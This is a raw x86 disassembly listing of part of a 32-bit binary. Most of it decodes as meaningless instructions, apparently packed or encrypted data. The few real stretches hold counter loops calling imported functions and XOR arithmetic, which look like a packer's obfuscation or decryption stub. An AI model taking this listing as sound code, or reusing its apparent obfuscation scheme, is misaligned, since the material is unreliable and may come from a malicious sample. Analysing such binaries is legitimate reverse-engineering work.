  40e60a:	je     0x40e607
  40e60c:	pushf  
  40e60d:	in     eax,dx
  40e60e:	sub    dh,dh
  40e610:	sbb    eax,edx
  40e612:	test   eax,0x771d1710
  40e617:	shl    DWORD PTR [ebx-0x6b39629],1
  40e61d:	das    
  40e61e:	pop    edx
  40e61f:	ins    BYTE PTR es:[edi],dx
  40e620:	pop    esp
  40e621:	inc    edx
  40e622:	push   ebp
  40e623:	mov    ecx,0x185edd9d
  40e628:	fwait
  40e629:	int3   
  40e62a:	sub    dh,ah
  40e62c:	aas    
  40e62d:	dec    ebx
  40e62e:	xor    al,0x9e
  40e630:	xchg   ebx,eax
  40e631:	mov    edx,0xe51e13b1
  40e636:	xor    BYTE PTR [ebx],bh
  40e638:	xor    ebx,DWORD PTR [edx+0x7b]
  40e63b:	xchg   ebx,eax
  40e63c:	jmp    0x40e5ee
  40e63e:	ins    BYTE PTR es:[edi],dx
  40e63f:	add    bl,BYTE PTR [edi+0x3d981e91]
  40e645:	jg     0x40e635
  40e647:	dec    ebp
  40e648:	loopne 0x40e680
  40e64a:	loope  0x40e611
  40e64c:	xor    ah,BYTE PTR [esi+0x65e58257]
  40e652:	jg     0x40e6a5
  40e654:	adc    DWORD PTR [esp+eax*4],esp
  40e657:	lock xchg DWORD PTR [ebx-0x68],eax
  40e65b:	push   ds
  40e65c:	aaa    
  40e65d:	sbb    ebp,DWORD PTR [edi+esi*8]
  40e660:	ret    
  40e661:	cwde   
  40e662:	add    ch,dl
  40e664:	dec    ecx
  40e665:	pop    ss
  40e666:	or     al,0x6d
  40e668:	out    dx,eax
  40e669:	mov    BYTE PTR [eax],0x15
  40e66c:	dec    eax
  40e66d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e66e:	or     BYTE PTR [esi+0x57acf938],ah
  40e674:	push   0x1f
  40e676:	mov    al,bl
  40e678:	sbb    ch,bl
  40e67a:	or     DWORD PTR [edi-0x21a1b19e],esi
  40e680:	cmc    
  40e681:	out    0xc0,eax
  40e683:	inc    ebp
  40e684:	xlat   BYTE PTR ds:[ebx]
  40e685:	adc    bh,BYTE PTR [ecx-0x57]
  40e688:	es jge 0x40e699
  40e68b:	jg     0x40e666
  40e68d:	xor    BYTE PTR [esi+0x6e9b1386],0x47
  40e694:	jns    0x40e6f7
  40e696:	cmc    
  40e697:	scas   eax,DWORD PTR es:[edi]
  40e698:	(bad)  
  40e699:	je     0x40e61e
  40e69b:	mov    ds:0x46a484ba,eax
  40e6a0:	xor    bl,BYTE PTR [ecx+0x59]
  40e6a3:	outs   dx,DWORD PTR ds:[esi]
  40e6a4:	inc    ebx
  40e6a5:	sub    cl,al
  40e6a7:	add    ebx,DWORD PTR [eax-0x7f]
  40e6aa:	cs ror edx,1
  40e6ad:	mov    ds:0xe7ae9d38,eax
  40e6b2:	nop    DWORD PTR [edx+eax*4+0x10]
  40e6b7:	pop    ss
  40e6b8:	int    0x44
  40e6ba:	jmp    0x6dd:0x7fc5ad95
  40e6c1:	push   0x4bb1d6c7
  40e6c6:	mov    ebx,0x4edffe15
  40e6cb:	dec    edi
  40e6cc:	xchg   edi,eax
  40e6cd:	stc    
  40e6ce:	data16 sbb ch,dl
  40e6d1:	jmp    0x40e6ed
  40e6d3:	frstor [ecx-0x5beeac32]
  40e6d9:	leave  
  40e6da:	sar    DWORD PTR [edi+0x54],0xfb
  40e6de:	xchg   esi,eax
  40e6df:	out    0xb3,eax
  40e6e1:	mov    al,0x7
  40e6e3:	ss dec esi
  40e6e5:	imul   ecx,DWORD PTR [eax-0x6dbec4fe],0xffffffe5
  40e6ec:	je     0x40e6c3
  40e6ee:	int3   
  40e6ef:	mov    ah,0xf7
  40e6f1:	jno    0x40e75e
  40e6f3:	mov    cl,0x21
  40e6f5:	mov    al,0xf4
  40e6f7:	stos   BYTE PTR es:[edi],al
  40e6f8:	loop   0x40e708
  40e6fa:	cmp    ebx,DWORD PTR [eax]
  40e6fc:	mov    ch,0x3f
  40e6fe:	xor    eax,esi
  40e700:	add    eax,ebx
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	out    dx,al
  40e733:	push   eax
  40e734:	mov    ds,WORD PTR [edi+0x7878bb3f]
  40e73a:	xor    eax,0x7978787e
  40e73f:	xchg   esi,eax
  40e740:	cmp    BYTE PTR [ecx+0x53],bh
  40e743:	(bad)  
  40e744:	out    dx,al
  40e745:	call   0x64a2:0xe9f27ec1
  40e74c:	call   0x4ead:0x8ab7c6b
  40e753:	jae    0x40e725
  40e755:	mov    dl,0xd6
  40e757:	inc    ebp
  40e758:	aam    0x4e
  40e75a:	sti    
  40e75b:	inc    ebp
  40e75c:	imul   edi,DWORD PTR [eax-0x2c],0xd103bf60
  40e763:	mov    dl,0x4e
  40e765:	in     al,0x4
  40e767:	sbb    ebp,DWORD PTR [ebp+edx*2-0x80]
  40e76b:	jns    0x40e742
  40e76d:	popa   
  40e76e:	inc    eax
  40e76f:	adc    al,0x28
  40e771:	addr16 call 0xf739c2f2
  40e777:	in     eax,dx
  40e778:	lods   eax,DWORD PTR ds:[esi]
  40e779:	ret    0x7326
  40e77c:	call   0x60505e56
  40e781:	mov    ah,0xb9
  40e783:	cmp    al,BYTE PTR [ebp-0x7d9f2cdc]
  40e789:	data16 adc ch,cl
  40e78c:	or     al,0x85
  40e78e:	mov    al,ds:0xa6afad2e
  40e793:	and    dl,BYTE PTR [edx]
  40e795:	xchg   edi,eax
  40e796:	jno    0x40e73f
  40e798:	repnz in al,0xd
  40e79b:	mov    ecx,0x50f29cd2
  40e7a0:	leave  
  40e7a1:	and    ebp,DWORD PTR [ebp+eiz*2-0x1951636d]
  40e7a8:	fsub   DWORD PTR [ebp-0x7f]
  40e7ab:	mov    al,0xa2
  40e7ad:	lea    eax,[ebx]
  40e7af:	mov    ss,ecx
  40e7b1:	div    DWORD PTR [eax+edx*2]
  40e7b4:	int3   
  40e7b5:	pushf  
  40e7b6:	daa    
  40e7b7:	sub    DWORD PTR ds:0x1ec2611c,edi
  40e7bd:	cmp    cl,BYTE PTR [ebp+eiz*8+0x6cb2273b]
  40e7c4:	sub    esp,ecx
  40e7c6:	ins    DWORD PTR es:[edi],dx
  40e7c7:	push   eax
  40e7c8:	fwait
  40e7c9:	pushw  0x3218
  40e7cd:	pusha  
  40e7ce:	pop    ecx
  40e7cf:	enter  0x1f6c,0xd6
  40e7d3:	jmp    0x433f73a5
  40e7d8:	or     eax,0xe519b8ce
  40e7dd:	and    BYTE PTR [edx+0x59],bl
  40e7e0:	jno    0x40e789
  40e7e2:	ja     0x40e776
  40e7e4:	or     ch,bl
  40e7e6:	mov    bl,0xaf
  40e7e8:	pushf  
  40e7e9:	addr16 out 0x46,eax
  40e7ec:	xchg   esp,eax
  40e7ed:	or     edi,esp
  40e7ef:	xchg   esp,eax
  40e7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f1:	jmp    0x8b036868
  40e7f6:	je     0x40e780
  40e7f8:	cld    
  40e7f9:	out    0x5a,al
  40e7fb:	xor    eax,eax
  40e7fd:	jno    0x40e79e
  40e7ff:	jmp    0x40e855
  40e801:	ja     0x40e7c6
  40e803:	sub    ebx,ebx
  40e805:	vpmaxsw xmm7,xmm5,XMMWORD PTR [ecx]
  40e809:	dec    ebp
  40e80a:	retf   
  40e80b:	ins    DWORD PTR es:[edi],dx
  40e80c:	stos   BYTE PTR es:[edi],al
  40e80d:	push   ebp
  40e80e:	clc    
  40e80f:	(bad)  
  40e810:	xchg   edi,eax
  40e811:	and    bh,BYTE PTR [ecx-0x1e2da865]
  40e817:	jns    0x40e82b
  40e819:	dec    edx
  40e81a:	rdpmc  
  40e81c:	fucomi st,st(6)
  40e81e:	dec    esp
  40e81f:	and    DWORD PTR [esi+0x61],0x21
  40e823:	pop    DWORD PTR [eax-0x7ecc4651]
  40e829:	xchg   ebx,eax
  40e82a:	dec    esi
  40e82b:	and    BYTE PTR [eax+0x3660b23f],bl
  40e831:	mov    cl,ch
  40e833:	and    dh,BYTE PTR [eax-0x9ebe8c8]
  40e839:	std    
  40e83a:	jmp    0x40e7c5
  40e83c:	nop
  40e83d:	mov    ch,0x34
  40e83f:	jge    0x40e809
  40e841:	push   edi
  40e842:	fnsave [ebx+ebx*4]
  40e845:	sti    
  40e846:	sbb    DWORD PTR [edi],esi
  40e848:	outs   dx,BYTE PTR ds:[esi]
  40e849:	(bad)  
  40e84a:	and    DWORD PTR [edx-0x4f],ebx
  40e84d:	mov    ch,0xaa
  40e84f:	ja     0x40e899
  40e851:	sub    dh,0x21
  40e854:	ret    0xe535
  40e857:	hlt    
  40e858:	data16 ficom WORD PTR [edi]
  40e85b:	mov    eax,0x33db33df
  40e860:	push   0x47
  40e862:	push   edx
  40e863:	pushf  
  40e864:	pop    esi
  40e865:	in     eax,0x34
  40e867:	rol    al,0x75
  40e86a:	push   esi
  40e86b:	sbb    DWORD PTR [ebp+0x72a2d8f7],esi
  40e871:	adc    ebp,eax
  40e873:	push   0xabe5feb6
  40e878:	jmp    0xcc29:0xe67c24d0
  40e87f:	jp     0x40e86e
  40e881:	add    al,0xa3
  40e883:	sub    al,0x8c
  40e885:	lahf   
  40e886:	inc    eax
  40e887:	push   ss
  40e888:	jg     0x40e8b1
  40e88a:	and    al,0x14
  40e88c:	ss push ebx
  40e88e:	ds push edi
  40e890:	inc    esp
  40e891:	leave  
  40e892:	fwait
  40e893:	and    al,0xc1
  40e895:	daa    
  40e896:	xchg   edi,eax
  40e897:	sub    bh,al
  40e899:	popa   
  40e89a:	je     0x40e89b
  40e89c:	nop
  40e89d:	adc    DWORD PTR [ecx+edx*4-0x2e],edi
  40e8a1:	or     BYTE PTR [edi-0x438ff9eb],cl
  40e8a7:	and    ch,BYTE PTR [eax+0x8]
  40e8aa:	xor    ebx,DWORD PTR [edi-0x6b97d0b8]
  40e8b0:	test   DWORD PTR [edi-0x61],ebp
  40e8b3:	cwde   
  40e8b4:	mov    al,ds:0x91ef1902
  40e8b9:	cs popf 
  40e8bb:	scas   eax,DWORD PTR es:[edi]
  40e8bc:	add    dl,BYTE PTR [edx+0x31]
  40e8bf:	push   0xa04b8915
  40e8c4:	into   
  40e8c5:	mov    al,BYTE PTR [esi+0x6f]
  40e8c8:	pop    edi
  40e8c9:	(bad)  
  40e8ca:	xor    ebx,DWORD PTR ds:[esi-0x7d]
  40e8ce:	(bad)  
  40e8cf:	in     al,dx
  40e8d0:	sbb    al,0xfa
  40e8d2:	dec    edi
  40e8d3:	push   ss
  40e8d4:	dec    ecx
  40e8d5:	ins    BYTE PTR es:[edi],dx
  40e8d6:	push   esp
  40e8d7:	outs   dx,BYTE PTR ds:[esi]
  40e8d8:	repz call 0xc5e8:0xac22e025
  40e8e0:	out    dx,al
  40e8e1:	jmp    0x459c:0x1e83ecc6
  40e8e8:	mov    edx,DWORD PTR [edi+esi*2-0x31]
  40e8ec:	and    ebx,esi
  40e8ee:	scas   eax,DWORD PTR es:[edi]
  40e8ef:	shl    BYTE PTR [edx-0x5],cl
  40e8f2:	pusha  
  40e8f3:	retf   
  40e8f4:	or     BYTE PTR [ebp-0x768859a5],0xf
  40e8fb:	(bad)  [esi]
  40e8fd:	mov    bl,0x6f
  40e8ff:	addr16 dec esp
  40e901:	add    ebx,DWORD PTR [eax+eax*1+0x32]
  40e905:	je     0x40e96d
  40e907:	retf   0x6e0d
  40e90a:	out    dx,eax
  40e90b:	ret    0x99f4
  40e90e:	jmp    0x51907cf
  40e913:	push   esi
  40e914:	xor    al,0x33
  40e916:	lods   eax,DWORD PTR ds:[esi]
  40e917:	jb     0x40e8f1
  40e919:	mov    dh,0xbe
  40e91b:	mov    esi,0x30dbcced
  40e920:	mov    ecx,0x742ebda5
  40e925:	cmc    
  40e926:	das    
  40e927:	mov    bh,0x4e
  40e929:	push   eax
  40e92a:	pop    ds
  40e92b:	sti    
  40e92c:	mov    ebx,0x5b197b60
  40e931:	dec    DWORD PTR [ebp+0x31b52ee3]
  40e937:	dec    eax
  40e939:	sbb    ch,0x23
  40e93c:	fwait
  40e93d:	add    al,0xc5
  40e93f:	jnp    0x40e8c8
  40e941:	or     cl,BYTE PTR [esi+0x28]
  40e944:	cmp    eax,0x3c52d459
  40e949:	mov    esp,0x44c1a634
  40e94e:	aaa    
  40e94f:	(bad)  
  40e951:	(bad)  
  40e953:	mov    eax,ds:0x653abd9
  40e958:	stos   DWORD PTR es:[edi],eax
  40e959:	pop    es
  40e95a:	fidivr WORD PTR [ebp+eiz*8-0x72]
  40e95e:	loopne 0x40e963
  40e960:	mov    eax,ds:0xadde74d8
  40e965:	call   0x59cc94f1
  40e96a:	xchg   ebx,eax
  40e96b:	gs out dx,eax
  40e96d:	sub    al,0xd6
  40e96f:	icebp  
  40e970:	mov    BYTE PTR ds:0xeaeea934,bh
  40e976:	inc    esp
  40e977:	in     eax,0x15
  40e979:	mov    eax,DWORD PTR [ebp+0xc]
  40e97c:	xor    eax,esi
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a811,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a811
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a811,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a811,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a811,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a811
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a811,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a811,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	add    eax,0xf4b9ca31
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	cmp    eax,0x4687c673
  40ea33:	fdivr  DWORD PTR cs:[ecx+ebp*2+0x680797e2]
  40ea3b:	(bad)  
  40ea3c:	out    0x9a,al
  40ea3e:	dec    eax
  40ea3f:	adc    DWORD PTR gs:[eax-0x7e],eax
  40ea43:	ins    BYTE PTR es:[edi],dx
  40ea44:	leave  
  40ea45:	ins    DWORD PTR es:[edi],dx
  40ea46:	xor    eax,0xa45e17be
  40ea4b:	mov    ds:0x5d289bea,al
  40ea50:	popf   
  40ea51:	and    edi,ebp
  40ea53:	daa    
  40ea54:	pusha  
  40ea55:	idiv   BYTE PTR [ecx-0x1e]
  40ea58:	scas   eax,DWORD PTR es:[edi]
  40ea59:	pushf  
  40ea5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea5b:	rcl    ah,0x1f
  40ea5e:	dec    eax
  40ea5f:	mov    ds:0xba2ecef1,eax
  40ea64:	add    dl,BYTE PTR [esi+0x6f]
  40ea67:	and    ecx,DWORD PTR [eax+0x2420c206]
  40ea6d:	mov    edi,ds
  40ea6f:	and    eax,0x4219efe8
  40ea74:	xor    esi,DWORD PTR [edi-0x16d500e9]
  40ea7a:	mov    ah,0x92
  40ea7c:	adc    dx,WORD PTR [eax+0x1b]
  40ea80:	inc    esi
  40ea81:	shr    BYTE PTR [ebx],0xc8
  40ea84:	or     dh,bl
  40ea86:	jmp    0xb09d:0xaf04c0f6
  40ea8d:	add    DWORD PTR [ebx+0x45],0x8f9daf48
  40ea94:	mov    esi,0xe422af51
  40ea99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea9a:	cdq    
  40ea9b:	lods   eax,DWORD PTR ds:[esi]
  40ea9c:	push   es
  40ea9d:	dec    edi
  40ea9e:	repz (bad) 
  40eaa0:	cli    
  40eaa1:	outs   dx,DWORD PTR ds:[esi]
  40eaa2:	or     al,0xf7
  40eaa4:	popa   
  40eaa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaa6:	xchg   ebp,eax
  40eaa7:	lods   eax,DWORD PTR ds:[esi]
  40eaa8:	mov    eax,ecx
  40eaaa:	aas    
  40eaab:	cmp    ch,0x85
  40eaae:	out    0x93,al
  40eab0:	clc    
  40eab1:	and    dh,BYTE PTR [ebx+0x118531f6]
  40eab7:	or     ebp,ebx
  40eab9:	pop    es
  40eaba:	mov    eax,ds:0x74a6d3a5
  40eabf:	push   ebx
  40eac0:	lea    eax,[esi]
  40eac2:	das    
  40eac3:	out    dx,eax
  40eac4:	mov    esi,0xcdd68c91
  40eac9:	addr16 pop ds
  40eacb:	lock lods al,BYTE PTR ds:[esi]
  40eacd:	inc    esi
  40eace:	out    0x15,al
  40ead0:	jg     0x40eb04
  40ead2:	cmp    eax,0x74d09187
  40ead7:	xchg   DWORD PTR [esi],ebp
  40ead9:	and    al,0x33
  40eadb:	pop    eax
  40eadc:	pop    ebp
  40eadd:	lods   eax,DWORD PTR ds:[esi]
  40eade:	xchg   DWORD PTR [edx-0x3a612415],ebx
  40eae4:	cwde   
  40eae5:	xor    bh,0x52
  40eae8:	sub    al,0x7
  40eaea:	out    0x6f,al
  40eaec:	jmp    0xca2c:0x984e1884
  40eaf3:	out    dx,al
  40eaf4:	addr16 mov ebp,0x2435bb5
  40eafa:	jns    0x40eb25
  40eafc:	leave  
  40eafd:	inc    esi
  40eafe:	mov    al,ds:0x9cbd402
  40eb03:	push   eax
  40eb04:	idiv   BYTE PTR ds:0xea723a4c
  40eb0a:	xchg   esi,eax
  40eb0b:	mov    ch,0x10
  40eb0d:	jle    0x40eb2b
  40eb0f:	gs int 0xea
  40eb12:	repnz inc ebx
  40eb14:	hlt    
  40eb15:	inc    eax
  40eb16:	leave  
  40eb17:	pusha  
  40eb18:	ss push cs
  40eb1a:	test   BYTE PTR [ecx+0x5fc1d0ea],cl
  40eb20:	jp     0x40eadd
  40eb22:	add    DWORD PTR gs:[esi+eax*2],ebx
  40eb26:	push   ds
  40eb27:	cmp    bh,BYTE PTR [ebp-0x5e1e44]
  40eb2d:	xor    edi,DWORD PTR [edi-0x26]
  40eb30:	push   cs
  40eb31:	cli    
  40eb32:	loope  0x40eaec
  40eb34:	fmul   QWORD PTR [esi-0x2791cff2]
  40eb3a:	mov    cl,0x6a
  40eb3c:	mov    edi,0xa47f4fe2
  40eb41:	dec    ebx
  40eb42:	das    
  40eb43:	mov    bl,0x7f
  40eb46:	js     0x40eb0e
  40eb48:	mov    BYTE PTR [edx+eiz*2-0x7d],ch
  40eb4c:	pop    edi
  40eb4d:	jnp    0x40eb04
  40eb4f:	jmp    FWORD PTR [ebx+0x6a]
  40eb52:	call   0x78b9c89
  40eb57:	loope  0x40eb62
  40eb59:	daa    
  40eb5a:	shl    DWORD PTR [ebx+edx*2+0x39],cl
  40eb5e:	jp     0x40ebd8
  40eb60:	mov    bh,0x47
  40eb62:	inc    ecx
  40eb63:	(bad)  
  40eb64:	xchg   edi,eax
  40eb65:	aaa    
  40eb66:	and    eax,0xb2f5fa96
  40eb6b:	in     al,dx
  40eb6c:	push   ss
  40eb6d:	loopne 0x40ebc8
  40eb6f:	inc    DWORD PTR [ebx+0x70ef62bb]
  40eb75:	ret    0x6984
  40eb78:	scas   eax,DWORD PTR es:[edi]
  40eb79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb7a:	repnz lock mov bl,0x5f
  40eb7e:	dec    edx
  40eb7f:	jns    0x40ebd0
  40eb81:	push   esi
  40eb82:	in     eax,dx
  40eb83:	loope  0x40eb59
  40eb85:	push   0x60
  40eb87:	scas   al,BYTE PTR es:[edi]
  40eb88:	hlt    
  40eb89:	popf   
  40eb8a:	(bad)  
  40eb8b:	mov    ds:0x694389b4,eax
  40eb90:	scas   eax,DWORD PTR es:[edi]
  40eb91:	rcl    BYTE PTR [eax+ecx*1+0x3c],cl
  40eb95:	push   edi
  40eb96:	lock cwde 
  40eb98:	mov    WORD PTR [edi+0xe],fs
  40eb9b:	jl     0x40eba0
  40eb9d:	jno    0x40ebc3
  40eb9f:	mov    ds:0xcbf60e2,al
  40eba4:	push   ebx
  40eba5:	fld    QWORD PTR [ebx+0x5f0ffc6c]
  40ebab:	add    BYTE PTR [edx+0x2f],0x7a
  40ebaf:	ror    DWORD PTR ds:0xd3729c34,0x8d
  40ebb6:	pop    edi
  40ebb7:	cmp    ch,BYTE PTR [edi-0x4]
  40ebba:	aad    0x4
  40ebbc:	fcmovnbe st,st(3)
  40ebbe:	(bad)  
  40ebbf:	jns    0x40eb76
  40ebc1:	fstp   QWORD PTR [esi+esi*4-0x3552696c]
  40ebc8:	dec    edi
  40ebc9:	ror    BYTE PTR [esi-0x23c0e7d6],1
  40ebcf:	push   0xad124e38
  40ebd4:	imul   edx,DWORD PTR [ebx],0x319ff7c1
  40ebda:	fsub   DWORD PTR [esp+edx*4-0x5e]
  40ebde:	dec    esi
  40ebdf:	push   ecx
  40ebe0:	cmp    eax,0xe0f4faad
  40ebe5:	jmp    0x40eb75
  40ebe7:	test   BYTE PTR ds:0x1acd8d1f,cl
  40ebed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebee:	jns    0x40ec43
  40ebf0:	mov    BYTE PTR [ecx+edi*8+0x7ccc958],dl
  40ebf7:	jne    0x40eb9e
  40ebf9:	pop    ds
  40ebfa:	sub    DWORD PTR [esp+esi*8+0x2dbe89fe],ebp
  40ec01:	cmp    DWORD PTR gs:[ebx+edi*1],ebx
  40ec05:	dec    esi
  40ec06:	push   ds
  40ec07:	cmc    
  40ec08:	mov    eax,0xf74ae2bc
  40ec0d:	sub    eax,0x4bc87f14
  40ec12:	push   edx
  40ec13:	push   edx
  40ec14:	iret   
  40ec15:	aam    0x83
  40ec17:	fisub  DWORD PTR [ecx+eax*8+0x19fd872c]
  40ec1e:	ret    0x1a42
  40ec21:	bound  ecx,QWORD PTR fs:[ebp-0x38]
  40ec25:	jmp    0x9ca3:0x2f589761
  40ec2c:	adc    DWORD PTR [ebx-0x7d891a1d],esp
  40ec32:	jbe    0x40eca7
  40ec34:	pop    ss
  40ec35:	inc    ebp
  40ec36:	nop
  40ec37:	mov    edx,0x8796ad9e
  40ec3c:	stos   DWORD PTR es:[edi],eax
  40ec3d:	xchg   DWORD PTR [ecx],esi
  40ec3f:	dec    edx
  40ec40:	test   al,0xf9
  40ec42:	xchg   edx,eax
  40ec43:	xchg   edi,eax
  40ec44:	sub    cl,BYTE PTR [ebx]
  40ec46:	push   es
  40ec47:	dec    esp
  40ec48:	xor    edi,edx
  40ec4a:	dec    esi
  40ec4b:	or     al,BYTE PTR [ebp-0x3c]
  40ec4e:	fisubr WORD PTR [edi+0x5c3d28b1]
  40ec54:	fstp   DWORD PTR [ecx-0x2b]
  40ec57:	lock aad 0x11
  40ec5a:	xor    esi,eax
  40ec5c:	loop   0x40ec42
  40ec5e:	iret   
  40ec5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec60:	popa   
  40ec61:	clc    
  40ec62:	mov    eax,0xed9473b
  40ec67:	dec    edi
  40ec68:	dec    ebp
  40ec69:	ret    0xf8f5
  40ec6c:	inc    ebx
  40ec6d:	ins    BYTE PTR es:[edi],dx
  40ec6e:	push   ss
  40ec6f:	cwde   
  40ec70:	arpl   WORD PTR [edi-0x57],bp
  40ec73:	or     DWORD PTR [ecx-0x1e],ebx
  40ec76:	sub    eax,DWORD PTR [esi]
  40ec78:	push   esp
  40ec79:	pop    ds
  40ec7a:	xchg   ecx,eax
  40ec7b:	pop    edx
  40ec7c:	mov    al,ss:0x93020219
  40ec82:	dec    eax
  40ec83:	aam    0x62
  40ec85:	pop    ecx
  40ec86:	adc    BYTE PTR [edx-0x7cc054ed],cl
  40ec8c:	(bad)  
  40ec8d:	push   ecx
  40ec8e:	jne    0x40ec23
  40ec90:	(bad)  
  40ec91:	paddw  mm2,QWORD PTR [edx+esi*2]
  40ec95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec96:	pop    esp
  40ec97:	mov    esi,0x8558b23
  40ec9c:	or     ecx,DWORD PTR ds:0x42a79d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a899,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a899,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a899,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a899,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a899
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a899,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a899
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a899,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a8a5,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a8a5
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a8a5,edi
  40ed34:	cmp    DWORD PTR ds:0x42a8a5,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a8a5,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a8a5
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a8a5,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a8a5,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a81d
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a811
  40ed88:	xor    DWORD PTR ds:0x42a895,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	mov    DWORD PTR [ebp+esi*8+0x17],esp
  40eda3:	popa   
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	call   0xde480911
  40edb0:	xchg   esp,eax
  40edb1:	into   
  40edb2:	sub    eax,0x43e6546c
  40edb7:	jnp    0x40ed4b
  40edb9:	jno    0x40ed5e
  40edbb:	pop    DWORD PTR [edi+0x3f2562e2]
  40edc1:	dec    ecx
  40edc2:	adc    dh,BYTE PTR [ebx+0x1d]
  40edc5:	mov    esi,0x11bc3b6e
  40edca:	gs inc esi
  40edcc:	add    eax,esi
  40edce:	dec    esp
  40edcf:	xchg   esi,eax
  40edd0:	neg    DWORD PTR [esp+edx*1-0x3848913a]
  40edd7:	scas   eax,DWORD PTR es:[edi]
  40edd8:	es rcl eax,0x55
  40eddc:	arpl   si,sp
  40edde:	cdq    
  40eddf:	std    
  40ede0:	cwde   
  40ede1:	or     BYTE PTR [esi+0x63cea558],dh
  40ede7:	push   cs
  40ede8:	fidivr DWORD PTR [ebx]
  40edea:	dec    esi
  40edeb:	out    dx,al
  40edec:	mov    dl,0x62
  40edee:	fsubr  QWORD PTR [ebx]
  40edf0:	and    al,0xf
  40edf2:	xchg   DWORD PTR ds:0x3ef70c67,ebx
  40edf8:	or     eax,ebx
  40edfa:	jo     0x40ee24
  40edfc:	nop
  40edfd:	repz daa 
  40edff:	cs push es
  40ee01:	jmp    0x590d:0xfd768054
  40ee08:	sub    ecx,ecx
